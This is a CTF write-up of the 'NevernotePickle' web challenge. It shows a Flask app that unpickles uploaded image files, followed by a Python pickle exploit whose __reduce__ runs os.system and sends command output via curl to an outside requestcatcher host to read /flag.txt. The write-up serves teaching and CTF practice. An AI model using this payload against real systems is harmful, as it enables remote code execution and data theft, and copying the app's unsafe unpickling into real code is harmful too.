---
title: '[RED CSAW CTF 2019] NevernotePickle'
published: true
tags: [writeup, web, deserialization, pickle]
author: sAINT_Barber
---

Challenge description:

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image1.png" width="300"/>

Lets note down that the flag is at /flag.txt on the server, indicating we will be performing RCE to read the flags contents.<br>
From the title and that we can understand the challenge will be about the pickle module in python<br>
Plus there is an app.py we can download, most likely the server source code that it is running, first things first lets take a look at the website.


So, we can set a title, content and upload an image.<br>
After playing around with the site there's not much to do except upload images.

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image2.png" width="400">

After uploading an image this is the outcome <br>
<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image3.png" width="200">

Now lets look at the *app.py* they gave us

```python
#!/usr/bin/env python3

from flask import Flask, render_template, send_from_directory, request, redirect
from werkzeug import secure_filename

import hashlib
import pickle
import os # i hope no one uses os.system

NOTE_FOLDER='notes/'


def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()


class Note(object):
    def __init__(self, title, content, image_filename):
        self.title=title
        self.content=content
        self.internal_title=sha256(title+content+image_filename)
        self.image_filename=self.internal_title + '.png'


def save_note(note, image):
    note_file=open(NOTE_FOLDER + note.internal_title +  '.pickle', 'wb')
    note_file.write(pickle.dumps(note))
    note_file.close()

    image.save(NOTE_FOLDER + note.image_filename)


def unpickle_file(file_name):
    note_file=open(NOTE_FOLDER + file_name, 'rb')
    return pickle.loads(note_file.read())


app=Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/notes/<file_name>')
def notes(file_name):
    file_name=secure_filename(file_name)
    if request.args.get('view', default=False):
        ##################################################################
        # let me go ahead and unpickle whatever file is being requested...
        ##################################################################
        note=unpickle_file(secure_filename(file_name))
        return render_template('view.html', note=note)
    else:
        ##################################################################
        # let me go ahead and send whatever file is being requested...
        ##################################################################
        return send_from_directory(NOTE_FOLDER, file_name)


@app.route('/new', methods=['GET', 'POST'])
def note_new():
    if request.method == "POST":
        image=request.files.get('image')
        if not image.filename.endswith('.png'):
            return 'nah bro png images only!', 403
        new_note=Note(
            request.form.get('title'),
            request.form.get('content'),
            image_filename=image.filename
        )
        save_note(new_note, image)
        return redirect('/notes/' + new_note.internal_title + '.pickle?view=true')
    return render_template('new.html')


if __name__ == "__main__":
    app.run(
        host='0.0.0.0',
        port=5000
    )
```

We notice the pickle module, after reading about it on google pickle serializes and de-serializes object structures, plus there is a warning about it!

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image4.png"> <br>

*Never unpickle data received from an untrusted source*

Basically our Note object will be instantiated, and the file name will be the hash it creates + .png at the end. Then our object hits the save_note() function which saves it TWICE, once with a .pickle extension and the it saves only the image with the .png extension. Meaning our images goes through the unpickle function as is, we can have the server unpickle whatever we want! Meaning we can pickle commands and have them executed on the server.

So we need a pickled payload, that saves onto the server, then we make a get request to our .png image, that will hit the unpickle function in the code and get RCE.

I wrote an exploit that accepts a command, and makes a POST request to requestcatcher (https://requestcatcher.com/) with the the data its sending being the command!
Then it pickles the object and saves it to a .png file.


```python
import cPickle
import os
import sys

class makePayload(object):
    def __reduce__(self):
        command = "curl -X POST -d $(" + comm + ") https://saint.requestcatcher.com/nevernote"
        return (os.system, (command,))

comm = sys.argv[1]
payload = cPickle.dumps(makePayload())
badImage = open("bad.png", "w")
badImage.write(payload)
```

Let me demonstrate:

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image5.png">

bad.png has been created, Then we can start up request catcher!

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image6.png" width=400>

And now lets create a note with the bad.png

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image7.png">

Now we need to remove the .pickle it is showing us and view the .png file, this is what will execute our code!

And done! Our png just executed the `whoami` command and we got a reply of 'chal'!

<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image8.png"><br><br>

Now lets do another one with `cat /flag.txt`!!


<img src="/assets/2019-10-01-RED-CSAW19-NevernotePickle/images/image9.png"><br>


Flag: `flag{you_had_to_have_known_this_flag_would_have_pickle_rick_in_it}`